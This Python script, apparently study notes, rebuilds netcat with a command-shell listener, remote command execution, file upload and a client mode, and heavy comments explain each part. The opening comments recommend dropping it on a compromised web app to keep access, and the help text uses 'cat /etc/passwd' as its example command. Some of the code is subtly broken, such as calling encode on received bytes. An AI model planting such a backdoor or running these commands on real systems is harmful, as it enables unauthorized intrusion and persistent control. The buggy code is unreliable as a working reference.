#NetCat is the utility knife of networking.
#You can read/write data across the network.
#You can execute remote commands, pass files back and forth and
#even open a shell.

#Often server won't have netcat installed, but they'll have python

#So we can build our own netcat.

#If you have broken into Web App, Defintely worth dropping a python callback to netcat.py 
#So can access it again.


import argparse #used to define what arguments a command line tool requires
import socket
import shlex    #Safe shell-like parsing. Helps split a string into individual compoeents like  it breaks up a string into the command and it's arguments
                #e.g  "nmap -vv -Sv -p 80 127.0.0.1"  would be interpreted correctly with SHLEX.
import subprocess #Used to interact with other system commands, or programs outside of python
import sys #Gives us low level control of how the python script interacts with OS
import textwrap #Used to wrap text in a way that is easier to read. Needed for NETCAT help page etc
import threading  #Used to run multipel processes / threads at the sametime to improve program efficiency 



def execute (cmd):
    cmd = cmd.strip()       #.strip() removes leading and trailing whitespace from command
    if not cmd:
        return

    output  = subprocess.check_output(shlex.split(cmd), stderr=subprocess.STDOUT)
    return output.decode()

                #subprocess.check_output    is used to run an external command and capture it's output
                                        #shlex.split(cmd)  is the command that gets ran    ensures it is in bash-like format and can be interpretted correctly by command line.
                                        #stderr=subprocess.STDOUT   ensure that error messages are also outputted in the STDOUT. So everythign it outputted in the same place - which is the command line 



#Class designed to work whether it is ran on the sending device on the receving device.
class NetCat:

    #paramters of this init function are accessible to others wthin the class.
    def __init__(self, args, buffer=None):

        #Pass in the Arguments and the Buffer
        self.args= args
        self.buffer = buffer

        #IPV4 Hostname, TCP Connection
        self.socket= socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        #Sets the Socket Options
        #SOL_SOCKET   targets the socket layer
        #Used to bind to the same address and port again without waiitng for teh OS to release it.
            #Good because you can resue the port and address immediately if the NetCat connection dies. Without needing to wait for the OS to release the socket.
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    def run(self):
        if self.args.listen:
            self.listen()   #if in Listner state then it will listen
        else:
            self.send() #if not in listener state, then it will send info insteaed (e.g if in upload file mode)




#Send functionality 
    def send(self):

        #soocket connects to the target IP argument supplied, and the targer PORT
        self.socket.connect((self.args.target, self.args.port))

        #If buffer is present (e.g not in listenign mode)
        if self.buffer:
            self.socket.send(self.buffer)   #Sends contents of the buffer to the target first


        #Next if client responds, we capture the response. 
        # Pause loop to give us the chance for input
        #We overwrite our old buffer with new inupt and send it.

        #Then loop starts again... until we end via keyboard interrupt.

        try:
            while True:
                recv_len = 1
                response = ''   #initially set response as empty
                while recv_len:     #Whilst data is being received
                    data = self.socket.recv(4096)   #receive the data in max 4096 byte chunks
                    recv_len = len(data)    #Check the length of the data
                    response += data.encode()   #Continously addpend the received data into the response variable
                    if recv_len < 4096:     #If data chunk received is less than 4096 btyes, then end the loop and stop receiving
                        break
                
                if response:    #If response has data inside it
                    print(response) #We are printing the response from the target


                    buffer = input('> ') #Now it is our chance to enter data to send 
                    buffer += '\n'  #Appends \n at the end of the message. Because in networking protocls data is ended with a new line.

                    self.socket.send(buffer.encode())   #Sends our buffer input.
                 
        except KeyboardInterrupt: 
            print('User terminated')
            self.socket.close()
            sys.exit()




    #Define listening functianlity 
    def listen(self):
        self.socket.bind((self.args.target, self.args.port))
        self.socket.listen(5)
        print(f"Listening on {self.args.target}:{self.args.port}")

        while True:
            client_socket, _ = self.socket.accept()

            #Initializes the thread to deal with the (handle) function, with the CLIENT SOCKET as argument.
            client_thread = threading.Thread(target=self.handle, args=(client_socket,))

            client_thread.start()


    #Handle    function  deals with Execute Commands, File Uploads, Shell Creation.
    def handle(self, client_socket):

        #Execute Commands
        if self.args.execute:   #If execute argument is present
            output = execute(self.args.execute)

            #Send commands to the CLIENT.
            client_socket.send(output.encode())



        #File Uploads: The client sends a file and this ensure it gets uploaded to the server.
        elif self.args.upload:
            file_buffer = b''   #Initially have empty file buffer

            #loop to receive data from client
            while True:
                data = client_socket.recv(4096) #Recive file data from client in 4096 byte chunks
                if data:    #If data is received 
                    file_buffer += data #append that data to file buffer
                else:
                    break   #if no data received then break Receiving loop.
            
            
            with open(self.args.upload, 'wb') as f:
                f.write(file_buffer)
            
            message=f'Saved file {self.args.upload}'
            client_socket.send(message.encode())



        #Shell creation
        elif self.args.command: #If the CommandShell argument is set 
            cmd_buffer = b''    #Initialy set shell buffer to empty
            while True:
                try:
                    client_socket.send(b'BHP: #> ') #Send initial shell bytes to client socket. To indicate the shell is ACTVIE on the CLIENT.

                    while '\n' not in cmd_buffer.decode(): #scans for NEWLINE character to determine when to process command. 
                        cmd_buffer += client_socket.recv(64)  #Because shell is active on the client.  Now the Client uses the shell to send Command. Server stores command in cmd_buffer
                    
                    response = execute(cmd_buffer.decode()) #When 'response' is called, the client's commands will be EXECUTED on the server.

                    if response:
                        client_socket.send(response.encode()) # The server sends the OUTPUT of the command back to the client.

                    cmd_buffer = b'' #After command gets executed on server, and output is displayed on client.  The CMD buffer is reset.
                
                except Exception as e:  #If there is error then the conneciton is closed to ensure there is no hanigng and resources are freed up.
                    print(f'Server killed {e}')
                    self.socket.close()
                    sys.exit()




if __name__ == '__main__':

    #Build out the description and help message of the NetCat Tool
    parser = argparse.ArgumentParser(description='NetCat Tool', 
                                     formatter_class=argparse.RawDescriptionHelpFormatter,

                                     #Help Text to go at end of the description
                                     #dedent    is to make it better looking by removing trailing whitesapce
                                     epilog=textwrap.dedent('''Example: 
                                                            netcat.py -t 192.168.1.108 - p 5555 -l -c #command shell
                                                            netcat.py -t 192.168.1.108 - p 5555 -l -u=mytest.text #upload to file
                                                            netcat.py  -t 192.168.1.108 -p 5555 -l -e=\"cat /etc/passwd\" #execute command
                                                            echo 'ABC' | ./netcat.py -t 192.168.1.108 -p 135 #echo text to server port 135
                                                            netcat -t 192.168.1.108 -p 5555 #connect to server
                                                            ''')
                                     )
    
    #----Add the actual arguments for the command line

    #action='store_true'        used to detect if the flag  '-c'  has been supplied or not.   If supplied --command will be set to True. 
    parser.add_argument('-c', '--command', action='store_true', help='command shell')

    parser.add_argument('-e', '--execute', help='execute specified command')

    parser.add_argument('-l', '--listen', action='store_true', help='listen')

    parser.add_argument('-p', '--port', default=5555, type=int, help='specifiy port')

    parser.add_argument('-t', '--target', default='192.168.1.108', help='specified IP')

    parser.add_argument('-u', '--upload', help='upload file')

    #Parse the arguments
    args=parser.parse_args()


#If setting up a listener, We envoke NETCAT object with empty buffer string
#Else, we send buffer content from teh Standard Input.


    if args.listen:
        buffer=''       #buffer being empty means we are not pre filling it with anything
                        #instead we are waiting to RECEIVE information from the sender (e.g when setting up reverse shell and looking for the shell connection)
    else:
        buffer = sys.stdin.read()   #If we are not in Listenig mode, then we can read the information we input in the command line because we are not looking for external connection attempt to send data.
    
    nc = NetCat(args, buffer.encode())
    nc.run()

